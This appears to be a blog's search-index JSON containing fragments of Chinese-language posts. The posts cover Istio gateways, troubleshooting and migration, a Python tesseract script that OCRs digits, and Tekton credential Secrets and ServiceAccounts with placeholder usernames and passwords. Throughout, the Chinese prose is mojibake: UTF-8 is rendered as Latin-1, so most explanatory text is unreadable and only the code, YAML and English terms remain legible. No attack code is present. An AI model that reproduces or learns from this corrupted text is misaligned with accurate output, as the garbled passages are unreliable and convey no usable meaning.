å¥åº·æ£€æŸ¥(é©±é€è´Ÿè½½å‡è¡¡æ± ä¸­ä¸å¥åº·çš„ä¸»æœº) å…·ä½“é…ç½®å¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ç¤ºä¾‹ Gateway Gatewayèµ„æºå…è®¸å¤–éƒ¨æµé‡è¿›å…¥IstioæœåŠ¡ç½‘æ ¼ï¼ŒGatewayèµ„æºæ˜¯åœ¨ingressgatewayåæ–¹ï¼Œåœ¨egressgatewayçš„å‰æ–¹ï¼Œæ‰€ä»¥æµé‡ä»å¤–éƒ¨è¿›å…¥ç½‘æ ¼åä¼šå’ŒGatewayèµ„æºåŒ¹é…,ç”¨äºæ§åˆ¶æ¥å—ä»€ä¹ˆæ ·çš„æµé‡(æ¯”å¦‚æŸä¸ªåŸŸåæˆ–è€…æŸç§åè®®). virtualserviceèµ„æºå’ŒGatewayå¯ä»¥åšç»‘å®šï¼Œè¿™æ ·Gatewayå°±å¯ä»¥å¯¹å¤–éƒ¨æµé‡è¿›è¡Œè·¯ç”±è§„åˆ™åŒ¹é…ï¼Œä»è€Œå‘å¾€ç›¸åº”çš„æœåŠ¡ã€‚ é™¤äº†è¿›å…¥ç½‘æ ¼çš„æµé‡å¯ä»¥æ§åˆ¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶å’Œè¿‡æ»¤ç¦»å¼€ç½‘æ ¼çš„æµé‡ã€‚ ** ä¸»è¦åŠŸèƒ½æ€»ç»“ ** Gatewayå…è®¸æŒ‡å®šL4-L6çš„è®¾ç½®ï¼šç«¯å£åŠTLSè®¾ç½® å¯¹äºL7çš„åŠŸèƒ½ï¼ŒIstioå…è®¸å°†VirtualServiceä¸Gatewayç»‘å®šèµ·æ¥,é€šè¿‡virtualserviceæ¥æä¾›èƒ½åŠ› åˆ†ç¦»çš„å¥½å¤„ï¼šç”¨æˆ·å¯ä»¥åƒä½¿ç”¨ä¼ ç»Ÿçš„è´Ÿè½½å‡è¡¡è®¾å¤‡ä¸€æ ·ç®¡ç†è¿›å…¥ç½‘æ ¼å†…éƒ¨çš„æµé‡ï¼Œç»‘å®šè™šæ‹ŸIPåˆ°è™šæ‹ŸæœåŠ¡å™¨ä¸Š ã€‚ä¾¿äºä¼ ç»ŸæŠ€æœ¯ç”¨æˆ·æ— ç¼è¿ç§»åˆ°å¾®æœåŠ¡ ** å­—æ®µä»‹ç» ** selectoré€‰æ‹©ä½ çš„æµé‡å…¥å£ç½‘å…³pod servers é…ç½®å“ªäº›æµé‡å¯ä»¥è¿›å…¥gateway hosts é…ç½®çš„æ˜¯å¯ä»¥é€šè¿‡å“ªäº›åŸŸåè®¿é—®åˆ°gateway port é…ç½®å¯ä»¥é€šè¿‡å“ªäº›ç«¯å£è®¿é—®åˆ°gateway(æµ‹è¯•ä¸‹æ¥å¯ä»¥å†™gateway serviceçš„portå’ŒtargetPort) ServiceEntry Sidecar ","date":"2021-09-12 01:04","objectID":"/post/2648/:2:1","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"å¯è§‚æµ‹æ€§: kialié€šè¿‡istio_requests_total{destination_service_name = â€œproductpageâ€}æŒ‡æ ‡è·å–å®æ—¶æ•°æ®å¹¶ç»˜åˆ¶å›¾å½¢ ","date":"2021-09-12 01:04","objectID":"/post/2648/:3:0","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"Istioæµé‡èµ°å‘é€»è¾‘ ","date":"2021-09-12 01:04","objectID":"/post/2648/:4:0","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"Istioè¯Šæ–­æ’é”™ç›¸å…³ é…ç½®å®Œgwã€vsã€dråè®¿é—®å‡ºç°404 æ£€æŸ¥ç½‘å…³é…ç½®ï¼Œç¡®è®¤gwçš„hostså’Œåè®®ç«¯å£å·ä¿¡æ¯æ­£ç¡®åã€æ£€æŸ¥vsçš„hostså’Œgateways(æ³¨æ„å½“gwåœ¨ä¸åŒnamespaceæ—¶éœ€è¦æŒ‡å®šgwçš„namespace.ä¾‹å¦‚: istio-system/public-gateway) ä¿®æ”¹envoy sidecaræ—¥å¿—çº§åˆ«istioctl proxy-config log ingress-nginx-controller-66c6bdcc4b-zpwkj.ingress-nginx --level http:debug ","date":"2021-09-12 01:04","objectID":"/post/2648/:5:0","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"ä½¿ç”¨Istioæ³¨æ„ç‚¹ podä¸­çš„æ ‡ç­¾éœ€è¦åŒ…å«appå’Œversionè¿™ä¸¤ä¸ªæ ‡ç­¾ åœ¨serviceä¸­è¦ç»™ç«¯å£å‘½å(ä»¥httpã€http2ã€grpcã€mongoã€redisè¿™ç§å¼€å¤´ï¼Œä½†æ˜¯ä¸ä½¿ç”¨è¿™äº›ï¼Œå®é™…æµ‹è¯•ä¸­æœªå‘ç°é—®é¢˜ï¼Œä¸çŸ¥é“ä½œç”¨åœ¨å“ª) åè®®é€‰æ‹© ","date":"2021-09-12 01:04","objectID":"/post/2648/:6:0","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"è¿ç§»æ³¨æ„ç‚¹ è€çš„æœåŠ¡å¦‚æœä½¿ç”¨äº†httpå¥åº·æ£€æŸ¥(livenessã€readinessã€startup)ï¼Œistioä¸­å¼€å¯äº†æœåŠ¡é—´TLSåŠ å¯†é€šä¿¡ã€‚ä¼šå¯¼è‡´k8s probeæ— é™å¤±è´¥ï¼Œpodä¼šæ— é™é‡å¯ã€‚å› ä¸ºkubeletå‘å¾€ä¸šåŠ¡å®¹å™¨çš„æµé‡ä¼šè¢«istio-proxyåŠ«æŒã€‚ ç½‘å…³è¿ç§»(å—åŒ—å‘æµé‡) æ”¹åŠ¨ingressæ–¹å¼ å°†ç›®å‰æ‰€æœ‰ingressçš„åç«¯æŒ‡å‘istio-ingressgatewayã€‚éœ€è¦æ”¹åŠ¨å¤§é‡ingressé…ç½®ã€‚æ—¥å¿—æ”¶é›†ä¹Ÿéœ€è¦æ”¹åŠ¨ã€‚ æµé‡èµ°å‘ clientâ€“\u003eslbâ€“\u003eingress-nginx-controllerâ€“\u003eistio-ingressgatewayâ€“\u003eenvoy ä½¿ç”¨istio-ingressgateway éœ€è¦è¿ç§»loadbalanceï¼Œå°†åŸslbçš„åœ°å€è¿ç§»åˆ°istioç½‘å…³çš„svcä¸Šã€‚è€æœåŠ¡ä¼šåœæœº æ—¥å¿—æ”¶é›†å¯èƒ½éœ€è¦æ”¹åŠ¨ã€‚æµé‡èµ°å‘clientâ€“\u003eslbâ€“\u003eistio-ingressgatewayâ€“\u003eenvoy æ³¨å…¥æ–¹å¼ä½¿ç”¨ingress-nginx-controllerä½œä¸ºç½‘å…³ istioæ³¨å…¥enovyå°†nginx-controllerå˜æˆç½‘æ ¼å†…,ç†è®ºä¸Šè®²å‡ ä¹æ— éœ€æ”¹åŠ¨(è¿˜æ²¡æµ‹è¯•è¿‡),åªéœ€æ»šåŠ¨å‡çº§nginx-controllerã€‚æµé‡èµ°å‘clientâ€“\u003eslbâ€“\u003eingress-nginx-controllerâ€“\u003eenvoy ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:0","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"ç°åº¦å‘å¸ƒ ä½¿ç”¨åŒdeploymentæ–¹å¼ äº‹å…ˆå‡†å¤‡virtualserviceå’Œdestinationruleï¼Œå®šä¹‰å½“å‰æµé‡å…¨éƒ¨æµå‘å½“å‰çº¿ä¸Šç‰ˆæœ¬ è·å–è€ç‰ˆæœ¬çš„Deploymentç‰ˆæœ¬ï¼Œä¾‹å¦‚job-v1 åˆ›å»ºæ–°ç‰ˆæœ¬çš„Deploymentï¼Œä¾‹å¦‚job-v2 ä¿®æ”¹destinationruleä¸­å­é›†çš„label selectorï¼Œé…ç½®serviceçš„ä¸¤ä¸ªå­é›†(çº¿ä¸Šç‰ˆæœ¬å’Œæ–°ç‰ˆæœ¬) ä¿®æ”¹virtualservice, é…ç½®ç°åº¦ç­–ç•¥ã€‚å¯ä»¥æ˜¯headerã€æƒé‡ã€cookieç­‰ kialiè§‚å¯Ÿæµé‡å’Œè¿è¡ŒçŠ¶æ€ï¼Œç›‘æ§è§‚å¯Ÿæ—¥å¿—å’Œpodè´Ÿè½½ è§‚å¯Ÿæ­£å¸¸åï¼Œä¿®æ”¹virtualserviceï¼Œå°†æµé‡åˆ‡åˆ°job-v2ã€‚ åˆ é™¤job-v1ç›¸å…³èµ„æº ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:1","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æ‚Ÿé“ æ€ä¹ˆæ‰ç®—ç½‘æ ¼å†…ï¼Ÿ podåŒ…å«envoy sidecarä»£ç†ã€‚(ä¸çŸ¥å¯¹ä¸å¯¹) å¦‚ä½•å®ç°nginx-ingress-controller + istioã€‚ ç›®å‰æƒ³çš„æ˜¯æŠŠenvoy sidecaræ³¨å…¥åˆ°nginx-ingress-controllerå°†å®ƒå˜æˆç½‘æ ¼å†…(åé¢å·²ç»å®ç°ï¼Œå¯è·³åˆ°æœ€å) gatewayé…ç½®çš„TCPç«¯å£ï¼Œä¼šåœ¨istio-ingressgateway podä¸­å¼€å¯ï¼Œ ä½†æ˜¯éœ€è¦æ‰‹åŠ¨æš´éœ²è¿™ä¸ªç«¯å£ï¼Œéœ€è¦ä¿®æ”¹svcæˆ–è€…æ·»åŠ svcã€‚ virtualServiceè¶…æ—¶ï¼Ÿ http.timeoutä¸‹é…ç½®ï¼Œè¡¨ç¤ºå½“å‰æœåŠ¡å‘å…¶ä»–æœåŠ¡è¯·æ±‚çš„è¶…æ—¶æ—¶é—´ã€‚æ¯”å¦‚å½“å‰æœåŠ¡æ˜¯Aï¼Œè®¾ç½®è¶…æ—¶ä¸º5sã€‚Aåœ¨è¯·æ±‚BæœåŠ¡æ—¶ï¼Œå¦‚æœBæœåŠ¡å“åº”æ—¶é—´è¶…è¿‡5s,é‚£ä¹ˆAæœåŠ¡ä¼šè¿”å›ç»™å®¢æˆ·ç«¯504 Gateway Timeout. å…¶å®æ˜¯envoy sidecarè¯·æ±‚å…¶ä»–æœåŠ¡æ—¶çš„è¶…æ—¶æ—¶é—´,æœ€ç»ˆçš„504ä¹Ÿæ˜¯envoyè¿”å›çš„ã€‚ virtualServiceæ•…éšœæ³¨å…¥ è®¾ç½®å½“å‰æœåŠ¡çš„å»¶è¿Ÿæˆ–è€…ä¸­æ–­ã€‚ å»¶è¿Ÿï¼šå»¶è¿ŸNç§’åenvoyä»£ç†å°†è¯·æ±‚å‘é€è‡³ä¸šåŠ¡æœåŠ¡ã€‚ ä¸­æ–­ï¼šenvoyç›´æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¯ä»¥è®¾ç½®å“åº”çŠ¶æ€ç ã€‚ ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:2","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æœªçŸ¥é¢†åŸŸ åŒå‘TLSé€šä¿¡ kialiä¸ºä»€ä¹ˆè¦å¯¹æ¥grafana Istio CNIæ’ä»¶æ˜¯ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆéœ€è¦(ä»£æ›¿äº†istio-initå®¹å™¨æ‰€å®ç°çš„åŠŸèƒ½) ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:3","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æ¢ç´¢ä¸æœªæ¥ ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:4","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"æ¸¡åŠ« vsä¸­é…ç½®äº†gatewaysåï¼Œé€šè¿‡å†…éƒ¨è®¿é—®æ—¶(å…¶ä»–podä¸­)ï¼Œvsè§„åˆ™å¤±æ•ˆäº†(å˜æˆè½®è¯¢äº†)ï¼Œåˆ é™¤äº†å°±æ¢å¤æ­£å¸¸ã€‚(çŒœæµ‹æ˜¯ç»‘å®šäº†gatewayå,åªæœ‰é€šè¿‡ç½‘å…³çš„æµé‡æ‰ä¼šç”Ÿæ•ˆvsé…ç½®çš„è·¯ç”±è§„åˆ™æ‰€ä»¥ç»‘å®šgatewayè¦æ…é‡) æ€»ç»“: å†…éƒ¨è°ƒç”¨çš„æ—¶å€™vsä¸é…ç½®gatewaysï¼Œå¤–éƒ¨è°ƒç”¨æ‰é…ç½®gatewaysã€‚ åé¢åœ¨æ–‡æ¡£ä¸­å‘ç°éœ€è¦åœ¨gatewaysä¸­æ·»åŠ meshï¼Œè¡¨ç¤ºç½‘æ ¼å†…ä¹Ÿä¼šç”Ÿæ•ˆï¼Œæ‰€ä»¥è¦åŒæ—¶ç”Ÿæ•ˆçš„è¯éœ€è¦åŠ è¿™ä¸ªã€‚ annotationè§£é‡Š https://istio.io/v1.9/zh/docs/reference/config/annotations/ å‡†å¤‡: åˆ›å»ºé¢å¤–çš„nginx-controller(é˜²æ­¢å½±å“ç°æœ‰ingress) https://help.aliyun.com/document_detail/151524.html?spm=5176.21213303.J_6028563670.21.374e3edahOhK8h\u0026scm=20140722.S_help%40%40%E6%96%87%E6%A1%A3%40%40151524.S_0%2Bos0.ID_151524-RL_nginxDAScontroller-OR_helpmain-V_2-P0_3 ç»™nginx-controlleræ³¨å…¥sidecar sidecar.istio.io/inject: â€™true' è®©nginxå¤„ç†å…¥å£æµé‡ traffic.sidecar.istio.io/includeInboundPorts: \"\" # å°†æŒ‡å®šç«¯å£çš„æµé‡é‡å®šå‘åˆ°envoy sidecar traffic.sidecar.istio.io/excludeInboundPorts: â€œ80,443â€ # å°†æŒ‡å®šç«¯å£çš„æµé‡ä¸é‡å®šå‘åˆ°envoy sidecar traffic.sidecar.istio.io/excludeOutboundIPRanges: â€œ10.1.0.1â€ # å°†æŒ‡å®šipèŒƒå›´çš„æµé‡ä¸é‡å®šå‘åˆ°envoy sidecarã€‚k get svc kubernetes -o jsonpath='{.spec.clusterIP}' ä¿®æ”¹ingressé…ç½® # æ³¨æ„è¿™æ˜¯åœ¨Ingressèµ„æºä¸­é…ç½®çš„ nginx.ingress.kubernetes.io/service-upstream: â€œtrueâ€ # é»˜è®¤nginxæ˜¯å°†æµé‡ç›´æ¥æ‰“åˆ°pod ipä¸­çš„,è€Œä¸æ˜¯é€šè¿‡service ipã€‚è¿™ä¸ªé…ç½®ç”¨æ¥ç¦ç”¨å®ƒï¼Œä½¿ä»–çš„æµé‡å‘å¾€service ipï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯è®©envoy sidecaræ›´å¥½çš„æ¥ç®¡æµé‡ nginx.ingress.kubernetes.io/upstream-vhost: â€œxxx.default.svc.cluster.localâ€ # è¿™é‡Œå†™çš„æ˜¯åç«¯Serviceçš„å®Œæ•´fqdnã€‚ç›®çš„æ˜¯ä¿®æ”¹Hostè¯·æ±‚å¤´çš„å€¼ã€‚è¿™æ ·çš„è¯vså¯¹è±¡é…ç½®çš„hostså°±èƒ½åŒ¹é…ä¸Šäº†ã€‚ è®¾ç½®nginx-controllerçš„envoy sidecaré…ç½® è¿™é‡Œè¿˜ä¸æ˜¯å¤ªäº†è§£ã€ç®€å•äº†è§£äº†ä¸€ä¸‹ï¼Œå¤§æ¦‚æ„æ€æ˜¯æ§åˆ¶nginx-controllerçš„envoy sidecarå‘å‡ºçš„æµé‡åªå…è®¸å‘åˆ°å“ªäº›namespaceæˆ–serviceã€‚ æˆ‘æµ‹è¯•ä¸‹æ¥æ²¡æœ‰é…ç½®è¿™ä¸ªï¼Œnginx-controller+istioé›†æˆè·‘é€šäº†,åº”è¯¥æ˜¯é»˜è®¤å…¨å…è®¸ã€‚åé¢éœ€è¦å•ç‹¬äº†è§£ä¸€ä¸‹ã€‚ apiVersion: networking.istio.io/v1alpha3 kind: Sidecar metadata: name: ingress namespace: ingress-namespace spec: egress: - hosts: # only the frontend service in the prod-us1 namespace - \"prod-us1/frontend.prod-us1.svc.cluster.local\" # any service in the prod-apis namespace - \"prod-apis/*\" # tripping hazard: make sure you include istio-system! - \"istio-system/*\" ","date":"2021-09-12 01:04","objectID":"/post/2648/:7:5","tags":["k8s","istio"],"title":"Istioå­¦ä¹ ç¬”è®°","uri":"/post/2648/"},{"categories":["python"],"content":" #!/usr/bin/python # -*- coding: UTF-8 -*- \"\"\" @author:soulchild @file:ocr-code.py @time:2021/08/26 \"\"\" from PIL import Image import requests import pytesseract import os # ä¸‹è½½å›¾ç‰‡ header = {'user-agent': 'xxx'} img = requests.get('https://xxx.xxx/f636a042.png', headers=header).content # ä¿å­˜å›¾ç‰‡ with open('resources/hotline.png', 'wb') as f: f.write(img) # å›¾ç‰‡ç°åº¦å¤„ç† im = Image.open('resources/hotline.png') x, y = im.size try: p = Image.new('RGBA', im.size, (0, 0, 0)) p.paste(im, (0, 0, x, y), im) p.save('resources/hotline.png') except: pass im = Image.open('resources/hotline.png') im = im.convert(\"L\") # im.save('resources/hotline.jpg') res = pytesseract.image_to_string(im, config='--psm 6 -c tessedit_char_whitelist=1234567890') print(res) os.remove(\"resources/hotline.png\") ","date":"2021-08-27 00:57","objectID":"/post/2644/:0:0","tags":["python"],"title":"tesseractè¯†åˆ«ç®€å•æ•°å­—å›¾ç‰‡","uri":"/post/2644/"},{"categories":["kubernetes","devops"],"content":"åœ¨ä½¿ç”¨å¤šä¸ªworkspaceå¹¶ä¸”ä½¿ç”¨ä¸åŒçš„pvcæ—¶ä¼šå‡ºç°è¿™ä¸ªæŠ¥é”™ã€‚ taskrun more than one PersistentVolumeClaim is bound è§£å†³æ–¹æ³•: k edit -n tekton-pipelines cm feature-flags å°†disable-affinity-assistantå‚æ•°æ”¹ä¸º\"true\" github issues: https://github.com/tektoncd/pipeline/issues/3480 ","date":"2021-08-24 18:08","objectID":"/post/2642/:0:0","tags":["k8s","tekton"],"title":"tekton-æŠ¥é”™Taskrun more than one PersistentVolumeClaim is bound","uri":"/post/2642/"},{"categories":["kubernetes","devops"],"content":"å‚è€ƒæ–‡æ¡£: https://tekton.dev/docs/pipelines/auth ","date":"2021-08-24 13:55","objectID":"/post/2638/:0:0","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"ä½¿ç”¨èƒŒæ™¯: åœ¨dindæˆ–è€…doodæ¨¡å¼ä¸‹,æˆ‘ä»¬ä¼šè¿è¡Œä¸€ä¸ªdocker clientç”¨äºä»Dockerfileæ„å»ºé•œåƒ,å¦‚æœdockerfileä¸­çš„åŸºç¡€é•œåƒéœ€è¦ç™»é™†ï¼Œå¹¶ä¸”æ„å»ºå®Œçš„é•œåƒéœ€è¦pushåˆ°å¦ä¸€ä¸ªä»“åº“ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±éœ€è¦ä¸¤ä¸ªä»“åº“å‡­è¯ã€‚å¦å¤–å¦‚æœæˆ‘ä»¬è¦è¿è¡Œçš„å®¹å™¨æœ¬èº«ä¹Ÿéœ€è¦å»ä»“åº“æ‹‰ä¸€ä¸ªé•œåƒ,é‚£ä¹ˆè¿™æ—¶å€™å°±éœ€è¦ä¸‰ä¸ªå‡­è¯äº†ã€‚å¦‚æœæˆ‘ä»¬è¿˜éœ€è¦ç”¨åˆ°git cloneä»£ç å‘¢ï¼Œåˆå¾—åŠ ä¸€ä¸ªssh ","date":"2021-08-24 13:55","objectID":"/post/2638/:1:0","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"annotation annotationå¿…é¡»ä»¥tekton.dev/gitæˆ–tekton.dev/dockerå¼€å¤´ï¼Œå€¼å°±æ˜¯ä»“åº“çš„ä¸»æœºåï¼Œéœ€è¦æºå¸¦http/httpsã€‚ å¯¹äºsshç±»å‹çš„åªéœ€è¦å¡«å†™hoståç§°ï¼Œæ— éœ€æºå¸¦åè®®åï¼Œå¦‚æœsshç±»å‹çš„ç«¯å£ä¸æ˜¯é»˜è®¤å€¼ï¼Œå¯ä»¥å†™æˆhost:portè¿™ç§å½¢å¼ ","date":"2021-08-24 13:55","objectID":"/post/2638/:2:0","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"å¯†ç ç›¸åŒçš„æƒ…å†µ ä¸ç®¡æ˜¯gitè¿˜æ˜¯dockerï¼Œå¦‚æœå¯†ç ç›¸åŒé…ç½®èµ·æ¥æ¯”è¾ƒç®€å•ã€‚ apiVersion: v1 kind: Secret metadata: name: ci-auth annotations: tekton.dev/git-0: https://github.com tekton.dev/git-1: https://gitlab.com tekton.dev/docker-0: https://gcr.io type: kubernetes.io/basic-auth stringData: username: aaa password: aaa annotationséƒ¨åˆ†éœ€è¦æ³¨æ„ã€‚ä½œç”¨ä¸»è¦æ˜¯ç”¨äºåŒºåˆ†æˆ‘ä»¬å®šä¹‰çš„ç”¨æˆ·åå¯†ç å¯ä»¥ç”¨äºå“ªä¸ªä»“åº“åœ°å€ï¼Œç”±äºannotationçš„keyä¸èƒ½ç›¸åŒï¼Œæ‰€æœ‰ä½¿ç”¨git-0ï¼Œgit-1æ¥è¡¨ç¤ºå¤šä¸ªä»“åº“åœ°å€ã€‚æœ€ç»ˆçš„å«ä¹‰: ç”¨æˆ·åaaaå¯†ç aaaçš„è¿™ä¸ªè´¦æˆ·å¯ä»¥ç™»é™†githubã€gitlabã€gcrã€‚ tektonæœ€ç»ˆä¸æ˜¯ç”¨çš„Secretï¼Œè€Œæ˜¯ç”¨çš„ServiceAccount,æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªServiceAccountæ¥å¼•ç”¨è¿™ä¸ªSecretï¼Œå¦‚ä¸‹ apiVersion: v1 kind: ServiceAccount metadata: name: ci-auth secrets: - name: ci-auth imagePullSecrets: - name: xxx è¿™ä¸ªSecretä¸­æˆ‘ä»¬å¤šå†™äº†imagePullSecretsï¼Œè¿™ä¸ªåœ¨æ‹‰å–å®¹å™¨æœ¬èº«æ˜¯ä½¿ç”¨ã€‚å’Œpodä¸­çš„imagePullSecretä¸€æ · ","date":"2021-08-24 13:55","objectID":"/post/2638/:3:0","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"ä¸åŒå¯†ç çš„æƒ…å†µ: # ç”¨äºç™»é™†https://gcr.ioã€https://docker.ioçš„é•œåƒä»“åº“å‡­è¯ apiVersion: v1 kind: Secret metadata: name: test0 annotations: tekton.dev/docker-0: https://gcr.io tekton.dev/docker-1: https://docker.io type: kubernetes.io/basic-auth stringData: username: test0 password: test0 --- # ç”¨äºç™»é™†https://my.ioçš„é•œåƒä»“åº“å‡­è¯ apiVersion: v1 kind: Secret metadata: name: test1 annotations: tekton.dev/docker-0: https://my.io type: kubernetes.io/basic-auth stringData: username: test1 password: test1 --- # ç”¨äºç™»é™†mygit.comçš„gitä»“åº“å‡­è¯ apiVersion: v1 kind: Secret metadata: name: test2 annotations: tekton.dev/git: mygit.com type: kubernetes.io/basic-auth stringData: username: test2 password: test2 --- # ç”¨äºç™»é™†mygit2.comçš„gitä»“åº“å‡­è¯(ssh-key) apiVersion: v1 kind: Secret metadata: name: test3 annotations: tekton.dev/git: mygit.com type: kubernetes.io/ssh-auth data: ssh-privatekey: base64åçš„ssh-key known_hosts: \u003cbase64-encoded-known-hosts\u003e å¯é€‰ --- apiVersion: v1 kind: ServiceAccount metadata: name: test secrets: - name: test0 - name: test1 - name: test2 - name: test3 imagePullSecrets: - name: xxx ","date":"2021-08-24 13:55","objectID":"/post/2638/:4:0","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"èƒŒååšäº†ä»€ä¹ˆï¼Ÿ ","date":"2021-08-24 13:55","objectID":"/post/2638/:5:0","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"åŸºäºbasic-authç±»å‹çš„git å¯ä»¥çœ‹åˆ°æ˜¯å†™äº†ä¸¤ä¸ªæ–‡ä»¶åˆ°å®¶ç›®å½• === ~/.gitconfig === [credential] helper = store [credential \"https://url1.com\"] username = \"user1\" [credential \"https://url2.com\"] username = \"user2\" ... === ~/.git-credentials === https://user1:pass1@url1.com https://user2:pass2@url2.com ... ","date":"2021-08-24 13:55","objectID":"/post/2638/:5:1","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"åŸºäºsshç±»å‹çš„git https://tekton.dev/docs/pipelines/auth/#ssh-auth-for-git === ~/.ssh/id_key1 === {contents of key1} === ~/.ssh/id_key2 === {contents of key2} ... === ~/.ssh/config === Host url1.com HostName url1.com IdentityFile ~/.ssh/id_key1 Host url2.com HostName url2.com IdentityFile ~/.ssh/id_key2 ... === ~/.ssh/known_hosts === {contents of known_hosts1} {contents of known_hosts2} ... ","date":"2021-08-24 13:55","objectID":"/post/2638/:5:2","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"åŸºäºbasic-authçš„docker === ~/.docker/config.json === { \"auths\": { \"https://url1.com\": { \"auth\": \"$(echo -n user1:pass1 | base64)\", \"email\": \"not@val.id\", }, \"https://url2.com\": { \"auth\": \"$(echo -n user2:pass2 | base64)\", \"email\": \"not@val.id\", }, ... } } ","date":"2021-08-24 13:55","objectID":"/post/2638/:5:3","tags":["k8s","devops","tekton"],"title":"tekton-é…ç½®è®¤è¯å‡­è¯","uri":"/post/2638/"},{"categories":["kubernetes","devops"],"content":"æ¦‚è¿° pipelineç”±ä¸€ä¸ªæˆ–å¤šä¸ªtaskå¯¹è±¡ç»„æˆ,å¹¶å¯ä»¥æŒ‰ç…§ç‰¹å®šçš„é¡ºåºæ‰§è¡Œ,pipelineåªæ˜¯å®šä¹‰çš„ä½œç”¨,ä¸ä¼šçœŸæ­£çš„è¿è¡Œ,è¿è¡Œéœ€è¦pipelinerunå¯¹è±¡ã€‚ å®˜æ–¹æ–‡æ¡£: https://tekton.dev/vault/pipelines-v0.18.1/pipelines ","date":"2021-08-22 21:21","objectID":"/post/2632/:1:0","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -pipelineèµ„æºå¯¹è±¡(ä¸‰) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"ä¸€ã€å¯¹è±¡å±æ€§ å¿…é¡»: apiVersion - tekton.dev/v1beta1. kind - Pipeline metadata - ç•¥ spec - pipelineå¯¹è±¡çš„è¯¦ç»†é…ç½® tasks - æŒ‡å®šç»„æˆpipelineçš„taskåŠå…¶æ‰§è¡Œçš„è¯¦ç»†ä¿¡æ¯ å¯é€‰: resources - å£°æ˜å½“å‰pipelineæ‰€éœ€çš„èµ„æºï¼Œç”±pipelinerunæä¾›å…·ä½“å†…å®¹ï¼Œåœ¨tasksä¸­çš„ä»»åŠ¡å¯ä»¥æŒ‡å®šä½¿ç”¨è¿™ä¸ªèµ„æº workspaces - å£°æ˜å½“å‰pipelineæ‰€éœ€çš„workspace params - å£°æ˜å½“å‰pipelineæ‰€éœ€çš„å‚æ•° results - taskå¯ä»¥åœ¨æ‰§è¡Œåé…ç½®resultsã€‚pipelineå¯ä»¥ä½¿ç”¨è¿™äº›results finally - æŒ‡å®šè¦åœ¨æ‰€æœ‰taskæ‰§è¡Œå®Œæˆåéœ€è¦å¹¶è¡Œæ‰§è¡Œçš„ä¸€ä¸ªæˆ–å¤šä¸ªä»»åŠ¡ã€‚ ","date":"2021-08-22 21:21","objectID":"/post/2632/:2:0","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -pipelineèµ„æºå¯¹è±¡(ä¸‰) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"äºŒã€å¸¸è§å±æ€§ä»‹ç» ","date":"2021-08-22 21:21","objectID":"/post/2632/:3:0","tags":["k8s","devops","tekton"],"title":"tektonå­¦ä¹ -pipelineèµ„æºå¯¹è±¡(ä¸‰) ","uri":"/post/2632/"},{"categories":["kubernetes","devops"],"content":"resources/workspaces/params 